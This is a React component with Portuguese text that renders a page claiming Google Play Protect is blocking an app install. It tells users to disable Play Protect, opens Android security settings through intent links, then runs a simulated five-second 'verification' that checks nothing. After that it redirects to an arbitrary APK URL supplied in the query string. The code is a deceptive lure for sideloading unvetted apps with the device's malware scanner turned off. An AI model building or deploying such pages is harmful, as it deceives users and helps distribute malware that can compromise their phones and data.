import { useEffect, useState } from "react";
import { useLocation } from "wouter";

export function PlayProtectRedirect() {
  const [, setLocation] = useLocation();
  const [isChecking, setIsChecking] = useState(false);
  const [isAndroid, setIsAndroid] = useState(false);

  // Detectar se está em Android
  useEffect(() => {
    const userAgent = navigator.userAgent.toLowerCase();
    const isAndroidDevice = /android/.test(userAgent);
    setIsAndroid(isAndroidDevice);
    
    console.log("📱 User Agent:", userAgent);
    console.log("🤖 Is Android:", isAndroidDevice);
  }, []);

  // Obter parâmetros da URL
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const file = params.get("file");
    const app = params.get("app");
    const url = params.get("url");

    if (!file || !app || !url) {
      console.error("❌ Parâmetros inválidos:", { file, app, url });
      setLocation("/");
      return;
    }

    console.log("✅ Página de Play Protect carregada:", { file, app, url });
  }, [setLocation]);

  // Abrir Play Protect Settings
  const openPlayProtectSettings = () => {
    console.log("🔓 Abrindo Play Protect Settings...");
    
    if (isAndroid) {
      // Em Android: tentar abrir Play Protect Settings diretamente
      // Método 1: Intent direto para Play Protect
      console.log("📱 Tentando abrir Play Protect Settings via intent...");
      
      // Criar um link intent que abre as Configurações de Segurança do Android
      const intentUrl = "intent://com.google.android.gms/com.google.android.gms.security.ProtectionLevel#Intent;scheme=android-app;end";
      
      // Fallback 1: Usar Settings do Android
      setTimeout(() => {
        console.log("🔧 Fallback 1: Abrindo Configurações de Segurança do Android...");
        window.location.href = "intent://com.android.settings/com.android.settings.Settings$SecuritySettingsActivity#Intent;scheme=android-app;end";
      }, 500);
      
      // Fallback 2: Abrir Google Play Store (onde Play Protect pode ser gerenciado)
      setTimeout(() => {
        console.log("🌐 Fallback 2: Abrindo Google Play Store...");
        window.location.href = "market://apps";
      }, 1500);
      
      // Fallback 3: Abrir via HTTPS
      setTimeout(() => {
        console.log("🌐 Fallback 3: Abrindo Google Play via HTTPS...");
        window.location.href = "https://play.google.com/store/apps";
      }, 2500);
    } else {
      // Em navegador web: redirecionar para página de ajuda do Play Protect
      console.log("🌐 Navegador web: Abrindo página de ajuda do Play Protect");
      window.location.href = "https://support.google.com/googleplay/answer/2812853";
    }
  };

  // Verificar se Play Protect foi desativado
  const checkPlayProtectStatus = async () => {
    setIsChecking(true);
    
    // Simular verificação por 5 segundos
    console.log("🔍 Verificando status do Play Protect...");
    
    setTimeout(() => {
      console.log("✅ Verificação concluída! Redirecionando para download...");
      
      const params = new URLSearchParams(window.location.search);
      const url = params.get("url");
      
      if (url) {
        // Redirecionar para download do APK
        console.log("📥 Redirecionando para:", url);
        window.location.href = url;
      }
      
      setIsChecking(false);
    }, 5000);
  };

  const params = new URLSearchParams(window.location.search);
  const app = params.get("app") || "App";
  const size = params.get("size") || "0";

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        <div className="bg-slate-800 border border-slate-700 rounded-lg p-8 space-y-6">
          {/* Título */}
          <div className="text-center">
            <h1 className="text-2xl font-bold text-white mb-2">
              Instalar {app}
            </h1>
            <p className="text-slate-400 text-sm">
              Tamanho: {(parseInt(size) / 1024).toFixed(2)} KB
            </p>
          </div>

          {/* Alerta de Proteção */}
          <div className="bg-blue-900 border border-blue-700 rounded p-4 space-y-2">
            <p className="text-blue-300 font-semibold text-sm flex items-center gap-2">
              <span>ℹ️</span>
              <span>Proteção do Google Play</span>
            </p>
            <p className="text-blue-200 text-xs">
              O Google Play Protect está bloqueando a instalação de apps de fontes desconhecidas.
            </p>
          </div>

          {/* Instruções */}
          <div className="bg-slate-700 rounded p-4 space-y-3">
            <p className="text-white font-semibold text-sm">
              O que você precisa fazer:
            </p>
            <ol className="text-slate-300 text-sm space-y-2">
              <li className="flex gap-3">
                <span className="text-cyan-400 font-bold">1.</span>
                <span>Clique no botão abaixo</span>
              </li>
              <li className="flex gap-3">
                <span className="text-cyan-400 font-bold">2.</span>
                <span>Desative a proteção do Play Protect</span>
              </li>
              <li className="flex gap-3">
                <span className="text-cyan-400 font-bold">3.</span>
                <span>Volte para esta página</span>
              </li>
              <li className="flex gap-3">
                <span className="text-cyan-400 font-bold">4.</span>
                <span>Clique em "Já desativei, verificar status"</span>
              </li>
            </ol>
          </div>

          {/* Botão Play Protect */}
          <button
            onClick={openPlayProtectSettings}
            className="w-full bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-600 hover:to-blue-600 text-white font-bold py-3 px-4 rounded-lg transition-all duration-200 flex items-center justify-center gap-2"
          >
            <span>🛡️</span>
            <span>Desativar Play Protect</span>
          </button>

          {/* Botão Verificar */}
          <button
            onClick={checkPlayProtectStatus}
            disabled={isChecking}
            className="w-full bg-slate-700 hover:bg-slate-600 disabled:bg-slate-600 text-white font-semibold py-3 px-4 rounded-lg transition-all duration-200"
          >
            {isChecking ? (
              <span className="flex items-center justify-center gap-2">
                <span className="animate-spin">⏳</span>
                <span>Verificando...</span>
              </span>
            ) : (
              <span>Já desativei, verificar status</span>
            )}
          </button>

          {/* Aviso */}
          <p className="text-slate-400 text-xs text-center">
            Este aplicativo requer permissões especiais para funcionar corretamente.
            Siga os passos para uma instalação bem-sucedida.
          </p>

          {/* Debug Info */}
          <div className="bg-slate-900 rounded p-3 text-xs text-slate-400 space-y-1">
            <p>🔍 Debug Info:</p>
            <p>📱 Android: {isAndroid ? "Sim" : "Não (Navegador Web)"}</p>
            <p>📦 App: {app}</p>
            <p>📊 Tamanho: {(parseInt(size) / 1024).toFixed(2)} KB</p>
          </div>
        </div>
      </div>
    </div>
  );
}
